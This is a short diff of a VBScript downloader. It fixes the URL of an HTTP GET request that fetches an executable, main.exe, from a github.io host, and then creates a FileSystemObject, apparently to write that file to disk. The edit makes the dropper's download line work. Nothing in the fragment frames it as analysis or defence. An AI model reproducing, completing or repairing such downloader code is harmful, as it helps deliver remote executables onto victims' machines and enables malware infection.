@@ -1,5 +1,5 @@
 Set x=CreateObject("MSXML2.XMLHTTP")
-x.Open "GET","mshta https://homleds.github.io/main.exe",False
+x.Open "GET","https://homleds.github.io/main.exe",False
 x.Send
 
 Set fso = CreateObject("Scripting.FileSystemObject")
